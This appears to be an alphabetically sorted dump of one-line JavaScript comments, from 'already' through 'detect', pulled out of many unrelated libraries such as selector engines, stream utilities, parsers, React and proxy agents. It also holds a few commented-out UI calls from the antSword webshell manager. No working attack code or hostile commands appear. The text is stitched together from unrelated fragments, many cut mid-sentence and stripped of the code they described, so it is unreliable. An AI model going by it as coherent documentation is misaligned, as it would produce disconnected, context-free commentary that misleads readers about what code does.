// already out of owned node
// already patched
// already replaced the hyphen ranges
// already warned
// also jump ahead all the blocks for the body
// also returned false.
// also supported for arrays
// alternative to using Object.keys for old browsers
// alternatively pass an object containing additional options
// always ensure folders are created
// always follow error
// always overwrite
// always return `null` so that localForage is consistent across
// always return object
// always returns true in newer browsers as per the standard.
// always returns whether classList contains token after toggling
// always table[l] <= val < table[r]
// always true for unary operators.
// am2 avoids a big mult-and-extract completely.
// amd
// amounts.
// an error happened.
// an error in the request blow up the response
// an example using an object instead of an array
// an existing type.
// an external backing store so that we can freeze the whole object.
// an identical 'prototype' property.
// an index go together.
// an object should be inserted so as to maintain order. Uses binary search.
// an+b format params for pseudo-classes
// an+b parameters or quoted string
// and (if present) cache the value in the node's internal data store. If no
// and 0 if they are equal
// and CommonJS for browser emulators (#13566)
// and Laura Doktorova's doT.js (https://github.com/olado/doT).
// and Modernizr execute.
// and `data` will have their expected values
// and a callback function
// and add it as knownLength option
// and add the remaining lines without any mapping
// and after the target driver
// and are either checked/don't have a checkable state
// and called read() to consume some data.  that may have triggered
// and cannot be clicked (`[type=submit]`) or are used in `x-www-form-urlencoded` (`[type=file]`)
// and construct a URL that a user clicks on (like a sign in button).
// and correctly escapes quotes within interpolated code.
// and create these arrays once queried for a source location. We jump through
// and deletePath the path from the root (inclusive) to replaceWith (exclusive)
// and ensure context is set to a default
// and hence handleInvalidRegexFlag is false.
// and http://docs.python.org/library/uuid.html
// and http://wiki.ecmascript.org/doku.php?id=harmony:let
// and https://github.com/websockets/ws/issues/1202
// and implement a caching wrapper function here.
// and inconsistent support for the `crypto` API.  We do the best we can via
// and is not needed when comparing the actual elements (and not their owners)
// and is not set directly on the node by a script.
// and its modifers (gmi) ...
// and jsdom features
// and keywords can also not be used as property names.
// and let it be printed generically.
// and let the next iteration check again
// and mark them as [Circular]
// and mark them as replaced value
// and might be considered as more preferable results.
// and most other unix tools that manage permissions.
// and new lines. It reduces any sequence of such characters to a single space.
// and not in consequential order
// and not share any injection state. Then this problem will be solved.
// and notes at the bottom; explicitly non-normative in this specification.
// and object pattern might appear (so it's possible to raise
// and other mocha methods. All feels very hacky though :-/
// and provide reference for storing '=' operator inside shorthand
// and removal by using an indirect global eval
// and remove it on removal.
// and remove overides
// and reset for each different context
// and reset the list
// and return the corresponding response
// and save ourselves from falling back to the pretty printer is if an
// and simply check if any non-visible tags appear in the source.
// and slower. Copying and editing the code allowed me to make
// and spelled backwards] [first word of first line spelled backwards]
// and tar format comes out of.
// and terminate these steps.
// and the SourceMap
// and the exception is handled.
// and the failures if any
// and the same name are rendered into the same form (same as #1939).
// and there seems no easy cross-platform way to detect them (@see chaijs/chai/issues/69).
// and therefore a broken symlink would be created.
// and try again.
// and undefined/non-string values are only allowed in object mode.
// and updating require calls as appropriate
// and waiting for 'end' on the entry at READENTRY
// and we need to make sure we don't double-fire the error event.
// and we need to re-evaluate how much data we can return to the user.
// and when you create one that shouldn't be
// and won't include inputs that use the HTML5 `form=` attribute. Since
// and/or If-None-Match header later on
// and/or updateComponent to do the actual update for consistency with
// and: function (word) {
// animation callback event
// animation duration
// animations on inline elements that are having width/height animated
// another script onerror (which would be an infinite loop)
// antSword.modules.shellmanager.list.updateHeader();
// antSword.modules.shellmanager.toolbar.reloadToolbar()
// any ThisExpression nodes.
// any alias
// any escaped char
// any kind of object works
// any modifications made to the array by the callback. I chose these
// any nodes.
// any number of arguments to specify the field.
// any supplied version is valid and passes all tests.
// anything else let's inspect with %O
// anything else switches us into object mode
// api request promise
// apostrophe is converted to a space in FilterWithoutEnglishLetters causing
// app.exit(0);
// app.hide();
// appName for IE11 reports 'Netscape' can no longer use
// appearing at the top of the program.
// appearing in methods and do not raise an error when they appear elsewhere.
// appears to fire in all of the remaining cases so we catch those and
// append mutation events
// appending children won't update the DOM. We need to ensure the fragment
// application/x-www-form-urlencoded body and the encoding of the page containing
// apply any `formatters` transformations
// apply transition with (1..n) arguments
// approximation.
// arbitrary CSS which may be problematic (I couldn't repro this):
// are added later (like 'loc' and 'range'). This just helps
// are case-insensitive.
// are declared here.
// are emptied (fx is the type by default)
// are finally checked against each other in GetCharSetName().
// are independently valid; helps keep this simple. Named captures are put back
// are likely far more normal files in the world than directories.  This
// are only applied when a character is found to actually have a
// are only valid in combination with the `/u` flag.
// are quite rare.
// are reversed.
// are we there yet?
// arg => { } case
// arg is for internal usage only
// arg1 now equals 'one' and arg2 now equals 'two'
// arg1 now equals 'three'
// argument list.
// argument to parseSubscripts to prevent it from consuming the
// arguments
// arguments are needed to create the filter function
// arguments will be dynamically type-checked against the Mozilla Parser API.
// arguments.
// array instance.
// array is always expected for the first argument
// array is in longest-to-shortest order.  Handy for indexing.
// array is in shortest-to-longest order.  Handy for indexing.
// array of callbacks for percentage
// array of categories (category view)
// array of non-empty arrays of matching ancestors
// array of results (category view)
// array of results (standard)
// array of status codes
// array.
// array.shift()
// arrayFormat default
// arrays to re-use
// as CommonJS/NodeJS module
// as Safari. Oh the lulz...
// as a micro-optimization.
// as a result.
// as a simple example this will check
// as an alternative to the sandbox attribute on IE<10
// as appropriate.
// as bindings in the outer scope.
// as documented in https://github.com/nodejs/node/issues/8871#issuecomment-250915913
// as equal. See http://www.ecma-international.org/ecma-262/7.0/#sec-regexp.prototype.tostring
// as second argument.
// as soon as we *do* get something into the buffer.
// as the arg rather than a function
// as the capture name
// as the hot path ends with doWrite
// as the logic for both is exceedingly similar. If the node is the target of
// as was in the original HTML code
// as xhr.onerror cannot be accessed
// ascending for time: a CMP b
// ascending order
// ascii capital letter
// ascii small letter
// assign a callback
// assign a type property to such nodes). Be optimistic and let
// assign callback
// assigning it a key.
// assignment operators
// assume it's a `superagent.Request` instance
// assume it's an Object
// assume the nodes are syntactically interchangeable.
// assume there is no 'length' or 'type' properties in the options object
// assumes 16 < DB < 32
// assumes 16 < DB <= 32 and assumes ability to handle 48-bit ints
// assuming it does.
// assuming openFiles is an array of file names
// assuming openFiles is an array of file names and saveFile is a function
// assumption is that looking up astral identifier characters is
// async
// async code to create a directory to store a file in
// async code to get some data
// async job accepts one element from the array
// asynchronous validation options:
// asynchronously loads the drivers that replace them.
// at js/src/tests/js1_8_5/extensions/reflect-parse.js in the source tree).
// at profiling tools.
// at the start of calling end()
// attach callbacks from options
// attach comments using collected information
// attach listeners
// attached so that the node core `http` can parse and handle the
// attempt a parseFloat and fallback to a string if the parse fails.
// attempt to get a cached `http.Agent` instance first
// attempt to get a proxying `http.Agent` instance
// attempt to negotiate http/1.1 for proxy servers that support http/2
// attempt to open that as a unix socket file.
// attempt to read from disk!
// attr= or just attr
// attr={value}
// attribute of iso-8859-1. Presumably also with other charsets that do not contain
// attribute operators
// attribute presence
// attribute to next and terminate these steps.
// attribute value
// attributes
// attributes referencing URI data values need special treatment in IE
// attributes start with @
// attributes: following node of element.
// auth
// auth hello
// auto json
// auto transition will slide down or up based on direction
// auto x-www-form-urlencoded
// auto-convert to string
// auto-detect header.
// autoCapitalize and autoCorrect are supported in Mobile Safari for
// autoFocus is polyfilled/normalized by AutoFocusUtils
// autoSave allows WebKit/Blink to persist values of input fields on page reloads
// autogenerated
// autogenerated\n\n');
// autolink
// automatically abort PASV mode
// automatically dequeued
// automatically hide on scroll
// available Sauce Labs credentials. Use `grunt test:local` to skip
// available browser launchers: https://npmjs.org/browse/keyword/karma-launcher
// available frameworks: https://npmjs.org/browse/keyword/karma-adapter
// available preprocessors: https://npmjs.org/browse/keyword/karma-preprocessor
// available reporters: https://npmjs.org/browse/keyword/karma-reporter
// available.
// avltDataElems is a simple array containing every piece of data in the tree
// avoid attribute selectors for IE QSA
// avoid duplicates when pushing results
// avoid loop if we're matching nothing
// avoid repeating the same token
// avoid space before method name
// avoid the V8 deoptimization monster!
// avoid traversing this subtree.
// avoids locking rendering if initialized in onReady
// aws4 can infer the HTTP method if a body is passed in
// b
// b < a
// b could be an object literal here
// b is preceding a
// b. LOAD_AS_DIRECTORY(RESOLVED_PATH)
// b. LOAD_AS_DIRECTORY(X)
// b. LOAD_AS_DIRECTORY(Y + X)
// b. LOAD_AS_FILE(DIR/X)
// b. Let subpath be the substring of matchKey starting at the index of the length of patternBase up to the length of
// b. STOP
// b. Set parentURL to the parent folder URL of parentURL.
// b0
// b0 - b7
// b8 - bf
// back to original track
// back-port the fix here.
// background-* props affect original clone's values
// backreferences and fix numerous cross-browser bugs
// backup the real host
// backwards compatibility.
// backwards-compat only
// backwards-compatibility for the old `require()` API. If we're in
// backwards. A buffer of Visual Hebrew generally looks like so:
// bad file path requested
// bad for performance and way too forgiving.
// bail on hooks
// bar
// base URL to apply to all endpoints
// base cases
// base path of url
// base64-arraybuffer
// base64-encoded data is supported
// baseUrl and uri.
// based on LLVM libc++ upper_bound / lower_bound
// based on setZeroTimeout by David Baron
// based on user configuration options
// basic format
// basically just the most minimal sort of Transform stream.
// basics
// baz: {
// be able to reprint it.
// be called.
// be composed with the new source map.
// be either left alone or desugared into AST types that are fully
// be fired.
// be in our element.
// be particularly problematic when the source root is a prefix of the
// be replaced by `[x-b]` which throws an error.
// be strict: don't ensures hasOwnProperty and go deep
// be triggered. The function will be called after it stops being called for
// because `originalEvent` should point to the original event for the constancy
// because blocking following processes maybe is not a good idea
// because it includes prereleases in the 1.2.3 tuple
// because it is fragile and can be easily faked with `Object.create()`.
// because it is its only offset parent
// because it still parses correctly; we do warn for other cases like nested
// because it's a different object identity
// because otherwise some prototype manipulation in
// because the buffer-to-string conversion in `fs.readFileSync()`
// because the index is slower when the collection is already
// because their .id fields are ignored anyway.
// because we do not want to detach the ref if another component stole it.
// before '.xXx' or the bug may not present itself
// before .type means .value is lost in IE11 and below)
// before it to distinguish it from an escaped pipe
// before the next rerender (including event handlers attached to ancestor
// before there was *not* enough.
// behave like it would if they were running a local HTTP server. See
// behavior as without this statement except with a better message.
// behavior of getting and setting a style property
// behavior we have in other enqueue* methods.
// behavior. The continuation byte check is included three times in the case
// being called before last iteration completion.
// being emptied incorrectly in certain situations (#8070).
// being hidden by cascaded rules or not
// belongs to partData
// better error message. (In the rare case that the less-than operator
// big-endian numbers. Append the three characters with code points
// big. So the result given by the algorithm will be a bit worse than
// binary is always well-balanced
// binary/unary operators
// binary: 011111
// binary: 100000
// bind events with delegated events
// binding element or assignment target.
// binds events
// bit string sequence
// black hole
// blank lines.
// block comment
// block required': {
// block until document ready
// blockquote
// body
// body is the decompressed response body
// body of an if statement.
// bold cyan
// bold yellow
// boolean attributes should return attribute name instead of true/false
// boolean attributes should return name instead of true/false
// boolean decision
// boolean when set
// boot
// both (all) of the holes.
// both fit!
// both plain key and camelCase key. #12786
// both tagName and nodeName properties may be upper/lower case
// bother modifying those since they'll be retried anyway.
// bottom edge
// bound by uuid
// bound in that scope is the catch parameter. Any other
// boundary must be in the same line(js sting or regexp)
// box these before the check
// boyer-moore derrived algorithm to safely skip non-boundary data
// br
// break ties for the same millisecond (precision of JavaScript's clock)
// break traversals
// brings us in line with the same behavior we have on initial render.
// browser
// browser main thread
// browser this is a little complicated due to unknown quality of Math.random()
// browser) is a `parse` function that takes a code string and
// browsers for all cases.
// browsers implement them.
// browsers slow down when dealing with 32-bit numbers.
// browsers that don't support the native Blob constructor. (i.e.
// browsers.
// bst.search(15) will now give []
// bst.search(18) will now give ['hello']
// bstDataElems is a simple array containing every piece of data in the tree
// bubble.
// buffer
// buffer the incomplete character bytes we got
// buffered _write cb's as it consumes chunks.  If consuming a single
// buffered data as everything has been already written and `readable.read()`
// buffers into a series of JS strings without breaking apart multi-byte
// bug in node.  Should never happen.
// build array of bytes
// build attribute string
// build metadata.
// build pseudoclass string
// build string from array
// build test expression out of structural pseudo (an+b) parameters
// buildable (by defining builders[getBuilderName(typeName)]) and
// built. The second SBCharSetProber is told to make the pair-of-letter
// bump the version number in those files
// but
// but `net.TcpNetConnectOpts` expects only a number
// but allow 1 minute for the file to finish loading.
// but guard against overflow
// but guard against overflow.
// but it must have a current display style that would benefit
// but it's useful to make sure its using the right spec.
// but joined with comma (not LineTerminator).
// but not /json-seq
// but omit the Flow-related types.
// but strip the //?/C:/ off of //?/C:/path
// but that sometimes behaves strangely in IE8. We could also try using
// but that will not handle a native abort
// but the base might've already been provided by the constructor.
// but the path reservations are required to avoid race conditions where
// but there are comments intervening between the parentheses and the
// but they are ignored because response was set above.
// but they are still not allowed in non-async functions.
// but they might both be false when the comment falls inside a node
// but we have to check for that.
// but we might need to add _that_
// but width seems to be reliably pixels.
// button: 0 0 0
// button: 0 1 2 (standard)
// button: 1 4 2 (onmouseup)
// by Taiwan's Mandarin Promotion Council
// by a digit or another two dots.
// by a handler lower down the tree; reflect the correct value.
// by common browsers.
// by default do not add missing left/right context
// by default stderr is used
// by getFieldValue) to the callback. If the object has no corresponding
// by invoking `closeAll`.
// by invoking the module's
// by mocks to assert on what gets mounted.
// by testing the element itself and traversing up through its ancestors in the
// by the high-resolution timer (via now()).  While these two won't be set
// by the native compositionend event may be incorrect. Japanese ideographic
// by using document.implementation
// by wrapping recursive function call in setTimeout 
// by: yzddMr6
// byte array
// bytes downloaded or uploaded so far
// bytes.
// c. DIRS = DIR + DIRS // Note: this seems wrong. Should be DIRS + DIR
// c. LOAD_AS_DIRECTORY(DIR/X)
// c. Return or throw the last fallback resolution null return or error.
// c. Return undefined.
// c. let M = X + (json main field)
// c0
// c0 - c7
// c8 - cf
// ca option is only relevant if proxy or destination are https
// cache is a Map (or PseudoMap) that matches the keys to"
// cache the content requests to pull locally
// cache the resulting module object for next time
// cachedIndex is no longer valid
// calculate current row distance from previous row using collator
// calculate current row distance from previous row without collator
// calculate screen boundaries
// call 'onDone()'.
// call `wrapped` as you would `myFunction`
// call beforesend and get any settings changes
// call drain immediately if there are no tasks
// call init
// call internal read method
// call on start of module test to prepend name to all tests
// call retry to make sure we're actively processing the queue
// call to self as log
// callWhenReady API method stubs are called before RequireJS
// callable Dom.shortcuts method has to be available
// callback
// callback after closing animation
// callback after closing or opening animation
// callback after hide animation
// callback after open animation
// callback after show animation
// callback before closing animation
// callback before element removed from dom
// callback before hide animation
// callback before open animation
// callback before show animation
// callback function invocations are stored in an array and returned at
// callback is no longer called if the deflate stream is closed while
// callback occurs on side change
// callback occurs on state change
// callback only when element added to dom
// callback should fire continuously whe evaluates to true
// callback should only occur one time
// callback times out on IE 10/11. Could be an
// callback when popup cannot be positioned in visible screen
// callback will be called with a reference to this path object for each
// callback.
// callback. The callback is also the only way of being notified that data has
// callback/promise is the same as what one would get out
// callback?
// callbacks
// callbacks before request
// called _after_ serialization.
// called after approve selector match
// called after deny selector match
// called after hide animation
// called after show animation
// called before hide animation
// called before show animation
// called ever time a tab beings loading remote content
// called every time tab visible
// called first time loaded
// called multiple times
// called on every load
// called on specific nodes. The last two arguments are optional. A
// calling rewind(backtrackToken).
// calls indexOf on internal array
// calls splice on internal array then rewrites indexed properties of dtl
// calls with 0 or 1 args are deprecated
// calls with non-string first argument are deprecated
// camel-case
// can be converted to a string via `JSON.stringify()` will be saved).
// can be invoked by Mutation Events or
// can be used OO-style. This wrapper holds altered versions of all the
// can implement the source URL resolution algorithm as outlined in
// can just ignore it.
// can quickly bailout if nothing has changed.
// can return to the user.
// can take multiple arguments
// can take priority.
// can transition does not return a value if animation does not exist
// can't be let or const
// can't throw since this utility is basically used everywhere
// can't use /x/y even behind `if` because it errors during compilation in IE9
// cannot move backwards
// capture a stack trace to the construction point
// capture in marker only the assignment expression itself.
// capture stack trace
// capture the stack
// captured when this technique is used.
// captures foo
// captures parent this
// cascaded feature detection for Internet Explorer
// case 'add-MassData':
// case 'in':
// case 'instanceof':
// case (1) [-2:not space][-1:final letter][cur:space]
// case (2) [-2:not space][-1:Non-Final letter][cur:space]
// case (3) [-2:space][-1:final letter][cur:not space]
// case insensitivity for html
// case sensitivity is treated differently depending on the document type (see map)
// case the current environment doesn't support the flags it uses.
// case treatment depends on document type
// cases are invalid.
// cast to ints.
// cast to string
// cast to string avoiding encoding special values
// catch the most you can
// catch this mistake early:
// catching the exception yourself.
// cause Acorn to call that function with object in the same
// cause the system to run out of memory.
// cb is called 2 times with:
// cb is called 3 times with:
// cell.hideHeader();
// cell.setHeight(43);
// cell_host_log.setWidth('550');
// certain amount of data is enough
// certain bugs can only be detected in standard documents
// certain that x is an Array (x could be a string with concat method).
// chain of promises).
// chaining multiple .get calls:
// change back to original path
// change class on state
// change context specific variables
// change should trigger an update of the owner which would recreate
// change the overflow attribute when overflowX and
// change to destination path
// changed here at 2015-12-21
// changed on 15-12-21
// changes or when an input with a placeholder is focused.
// changes to the function body.
// changing ports or protocols).  This matches the behavior of curl:
// changing the TypedArray changes the Buffer also
// char order of last character
// charCode will always be < 0x10000 in javascript.
// character ...[or]... If the remainder of attribute-value contains a
// character of the request-path that is not included in the cookie- path
// character offsets that denote the start and end of the comment.
// character.
// characters that fall in our sampling range
// characters.
// characters. CESU-8 is handled as part of the UTF-8 encoding.
// chars. Paste events should not lead to BeforeInput events.
// charsets are identical with respect to code points. Meaning that for the
// charsets:
// check 'async [no LineTerminator here] function'
// check Selector API implementations
// check all values
// check allows it to work with `_.map`.
// check dom argument for dom element specific properties
// check element is descendant of container
// check for keywords used as local names
// check for sticky bit
// check for the attribute presence
// check for the result of the stringifying.
// check for windows weird way of specifying a directory
// check if async happened
// check if before send cancelled request
// check if component newly created
// check if element matches the :link pseudo
// check if export is defined
// check if input is a file path or just string data to store
// check if it's a symlink or dir (using stat mode constants)
// check if redirecting to a different protocol
// check if slice() can convert nodelist to array
// check if the fixture has not been modified
// check if the plane crashed
// check next of same letter
// check node emptyness
// check position immediately on init
// check that two elements are ancestor/descendant
// check the length and limit options.
// check whether this is array comprehension or regular array
// check whether unref is available as it differs from browser to NodeJS (#33)
// checkAllFields once. Calling checkAllFields is too strict when deep
// checkToken determines whether the function is
// checkbox checked
// checked against either the strict or loose comparator form
// checks and only if none of them worked
// checks fail when running the tests using casper.js...
// checks the src and dest inodes. It starts from the deepest
// checks whether active/inactive state can be given
// child position by nodeName
// child position by nodeType
// children non-generically.
// children of the replacement node.
// children. Definitely want to avoid this.
// choose b arbitrarily
// chunks.
// circumstances:
// class that triggered it.
// classMethodOrDeclareMethodCommon
// classMethodOrPropertyCommon
// classes
// classes listed
// classic callback style
// classnames used
// clean up and get some utility properties
// clean up jobs
// clean up timing event listeners if needed on error
// cleanup
// cleanup dynamically embedded objects to fix audio/video threads and force open sockets and NetConnections to disconnect
// cleanup event handlers once the pipe is broken
// cleanup library's main closures to avoid memory leaks
// clear all timeouts
// clear data
// clear screen
// clear the cache if it's a case-insensitive unicode-squashing match.
// clear the error
// clear the timer and remove it to help prevent unintended concurrency
// cleared.
// clears embed
// client code does not have to provide a try-catch block to
// clobbering an fs object to create one of a different type.)
// close calls delete on its document.
// close match group
// close should not have been called
// close the FTP client socket connection
// closed tag
// closed when an error is emitted.
// closing doubles
// closing singles & apostrophes
// code
// code instead.
// code point above 128.
// code printed for the new node with no ill consequences.
// code referenced by extensions
// code string reused to build compiled functions
// code to add the data object to the top of the scope chain.
// code unit is the high surrogate of a surrogate pair
// code unit length (16 bit)
// code we must have exited earlier.
// code.
// coefficient -- (inverse of q) mod p
// coerce string value into JS value
// coerces header names to lowercase
// coerces to literal Infinity
// coercible string can be more right-ward without the same terminus.
// collapse sibling forms: the second one becomes a child of the first one.
// collect a's properties
// collect b's properties
// collect comments in Esprima's format
// collect ranges for each node
// collect token ranges
// collection of strings
// collections. In this case it's usually a good idea to use autoload for all collections.
// collide on matches across case and unicode normalization
// collide with any variables in nested/enclosing scopes.
// color is for Safari mask-icon link
// column
// combinator selector
// comma
// commas separators are treated sequentially to maintain order
// commas so that the resulting code is interpreted with
// comment must be separated from fn by an unbroken series of
// comment?
// comments that occur inside node.loc. Returns an empty array for nodes
// comments will be attached to program.body[0] instead of program.
// commit the changed version number
// common in the npm registry.
// commonjs
// commonly used development environments.
// compared to the original.
// comparing constructors is more strict than using instanceof
// comparison could exclude that field.
// comparison.
// compile a CSS3 string selector into ad-hoc javascript matching function
// compile a comma separated group of selector
// compile matcher resolvers if necessary
// compile selector into ad-hoc javascript resolver
// compile selector resolver if necessary
// compiled match functions returning booleans
// compiled select functions returning collections
// completion of its arg still works.
// complex case.
// complexity.
// component to placate it
// component when server rendering
// componentDidUpdate) but we need to check here too in order to catch
// componentWillMount during server-side rendering.
// componentWillMount. Either fix it or disallow doing so completely in
// components don't work properly in conjunction with event bubbling because
// components that rendered and the DOM operations that actually
// compressed data as it is received
// computing path.needsParens() except in this case.
// concat elements to data
// concat elements to data and callback
// conditionally execute the original function.
// conditions prevent the data from being read:
// config values.
// configs is now a map of JSON data
// configurability must be true to allow the property to be
// configurable must be true to allow the property to be
// configure it to lower the limit.
// configure the precise type hierarchy that you need.
// connect
// connect to localhost:21 as anonymous
// connection via the `callback()` function throwing.
// conservative assumption of the latency.
// consider: /./ instanceof Object;
// consider: typeof [] === object
// consider: typeof new Date() === object
// consider: typeof null === object
// consistency with node versions before v6.8.0
// consistently. If they are created inside a <div> they will be initialized in
// console.debug('Download the React DevTools ' + (showFileUrlMessage ? 'and use an HTTP server (instead of a file: URL) ' : '') + 'for a better development experience: ' + 'https://fb.me/react-devtools');
// console.log('false && ___');
// console.log('false || ___');
// console.log('if/? (false)');
// console.log('if/? (true)');
// console.log('if/? ___');
// console.log('true && ___');
// console.log('true || ___');
// console.log(res);
// const LANG_T = antSword['language']['toastr'];
// const Update = require('./update');
// const all = await stream.collect()
// const data = await stream.collect()
// const data = await stream.concat()
// constant
// constant time.
// constrain to a minimum and maximum number of digits.
// construct Cookie header
// construct a filter that limits the file entries listed
// construct headers objects
// construct new options
// construct query objects
// construct utility properties
// constructor
// consume the data with asynchronous iteration
// consuming the return value of the function that follows.
// contain such byte. We need to be more consts.error forgiven.
// contained any escape sequences. This is needed because words with
// container
// containing multiple / chars.
// containing specific `key:value` pairs.
// contains buffers or objects.
// content fuzzy matches (last in results)
// content of the page will be written to the file
// content starts with value (first in results)
// content type is always returned
// content-length
// content-type
// content-type bug: https://code.google.com/p/chromium/issues/detail?id=408120"
// context
// context for applying state classes
// context for binding scroll events
// context to attach popups
// context to predict whether a regular expression is allowed in a
// context used for state
// context_menu.loadStruct(this.getPath('host_menu.json'));
// context_menu.setIconsPath('./codebase/imgs/');
// continuation bit is marked.
// continuation bit. The continuation bit tells us whether there are more
// continuation:
// continue an expression (like the body of a string).
// continue jumps to that label.
// continue to.
// continue using the old builder function.
// continuing only obscures problems.
// control user notifications
// convert all headers to arrays.
// convert array buffers and typed array views into buffers
// convert data descriptor
// convert escape sequence in a CSS string or identifier
// convert external file attr int into a fs stat mode int
// convert from many types to a Buffer
// convert it into an async function
// convert single codepoint to UTF-16 encoding
// convert single codepoint to string
// convert the expected length to an integer
// convert the limit to an integer
// convert to IDN if any non-ASCII characters
// convert to an old-style stream.
// convert to serialized 'raw' cookies
// converted to a scientific notation string.
// cool: because you can call this method at any point in the
// copied from goog.string.regExpEscape in the Closure library.
// copy arguments
// copy current col value into previous (in preparation for next iteration)
// copy from properties
// copy indexed properties from internal array
// copy last col value into previous (in preparation for next iteration)
// copy of this software and associated documentation files (the
// copy the data into the new allocation
// core zlib. We override .flush() temporarily to intercept that and
// correct value when it hasn't been explicitly set
// correctly by default.
// correspond to encoded bytes (if 128 - then lower half is ASCII). 
// corresponding driver method until localForage is ready. These stubs
// corresponding to those offsets
// corrupt its internal state.
// could have been passed in originally. This generated URI is used
// count buffered requests
// count equals to 3
// count equals to 4
// cover
// covering:
// covers:
// create SWF
// create a cargo object with payload 2
// create a copy so we don't cause conflicts with
// create a queue object with concurrency 2
// create a zero-filled buffer (safe)
// create an instance of the `HttpProxyAgent` class with the proxy server information
// create an instance of the `HttpsProxyAgent` class with the proxy server information
// create an instance of the `PacProxyAgent` class with the PAC file location
// create an instance of the `SocksProxyAgent` class with the proxy server information
// create an uninitialized buffer (potentially unsafe)
// create anonymous resource
// create circular reference
// create dynamic stylesheet + get a global reference to it
// create error
// create fake element to determine display state
// create form-data object
// create it for us if it doesn't exist.
// create json object with ciphertext
// create or extend NW namespace
// create the error object
// create xmlns
// createData()
// creates a new Buffer containing ASCII bytes
// criterion.
// cross-browser compatiblity functions ////
// crude way to check if we should resume
// css animation to use
// curlyLastIndex ensures each token is pushed or popped exactly once
// current array.
// current node) and passes them to the callback as third parameter
// currentTarget is set when dispatching; no use in copying it here
// currently fixed bottom
// currently fixed top
// currently share these stateful modules.
// custom filename take precedence
// custom filepath for relative paths
// custom header specified (as string)?
// customized sort function
// cyan
// cycle to simulate higher resolution clock
// d. LOAD_AS_FILE(M)
// d. Let pjson be the result of READ_PACKAGE_JSON(packageURL).
// d. Let resolvedTarget be the URL resolution of the concatenation of packageURL and target.
// d. Return resolved.
// d. let I = I - 1
// d0
// d0 - d7
// d8 - df
// darhs
// dashdash option spec with a bogus 'type'.
// data = link path of next file
// data = path of next file
// data from the HTML5 data-* attribute
// data halfway through streaming a response.
// data is being processed.
// data is invalid
// data is the result of parsing the text.
// data that might've been store with a camelCased key.
// data that will
// data will be read as a single chunk and emitted synchronously in a single
// data-* attributes should be lowercase; suggest the lowercase version
// database.
// databass
// date-time parsing constants (RFC6265 S5.1.1)
// date-time: http://tools.ietf.org/html/rfc3339#section-5.6
// date: http://tools.ietf.org/html/rfc3339#section-5.6
// dbMask
// db[key] = undefined;
// deadline
// debounced at least once.
// debug content outputted to console
// debug data includes performance
// debug output
// decimal number starts with '0' such as '09' is illegal.
// decision is made according to the final-letters scores maintained and Both
// declarations
// declarations create bindings in the outer scope.
// declare function(a: B): void; OR
// decode an encoded blob
// decode domain name parts
// decode domain names
// decode email addresses
// decode the last character properly.
// decode upon decompressing with captured encoding
// decompressed data as it is received
// deep directory trees.
// deep extended (see ajaxExtend)
// deep referencing
// deeply mutated and reused.
// def
// default async is asap;
// default chars
// default highWaterMark value
// default is not recursive
// default mode for dirs created as parents
// default options
// default order
// default position relative to element
// default size is 300x150 in Gecko and Opera
// default text/* to utf-8
// default to Connection:keep-alive.
// default to http://
// default to json
// default to true for now
// default to x-www-form-urlencoded
// default true for root
// default values
// default: use aws-sign2
// defaults to Infinity
// defaults to US-ASCII only if type is not provided
// defaults to document
// defaults to x-www-form-urlencoded
// defer call
// defer further parser to one of its callers when it encounters an
// defer onattribute events until all attributes have been seen
// defer the callback if we are being called synchronously
// deferred from S5.3
// deferred[ done | fail | progress ] for forwarding actions to newDefer
// deferred[ resolve | reject | notify ]
// define all public properties here
// define like this to please codeintel/intellisense IDEs
// define namespace
// define namespaces for modules
// defined in the class body.
// definitions for automatic type detection
// del (gfm)
// delay before event
// delay before hiding menu after blur
// delay before searching
// delay between animations in group
// delay between attempts so that we'll retry these jobs sooner
// delay in ms for fail safe
// delay in ms for fail safe animation callback
// delay used to prevent accidental refiring of animations due to user error
// delayed syntax error at correct position).
// delegated event context
// delete accessors for all frames
// delete restores the original property definition
// delete the entry (recursively) according to its type
// delete the last-seen occurrence.
// delete this.manager.cache[path];
// deleteData leaves an empty `TextNode` which offsets the index of all
// deleted when data is removed
// deleted with the delete operator
// deletion
// delimited string
// delimiter at the beginning of the data
// delimiter key
// depending on the implementation; some applications substitute
// depending on their creation NAMESPACE in createElementNS()
// depends on are still spread into arguments.
// deprecated
// deprecating this convenience.
// deps is a config object
// descending for length: b CMP a
// descending order
// designed to be sync/async agnostic.
// dest in this case would result in removing src contents
// dest will only emit one 'drain' event for the multiple writes.
// destroyed (in event handlers).
// destruction of top-level components is guarded in ReactMount.)
// detect IE bug with dynamic attributes
// detect IE bug with non-standard boolean attributes
// detect IE gEBTN comment nodes bug
// detect Opera browser
// detect Opera gEBCN second class and/or UTF8 bugs as well as Safari 3.2
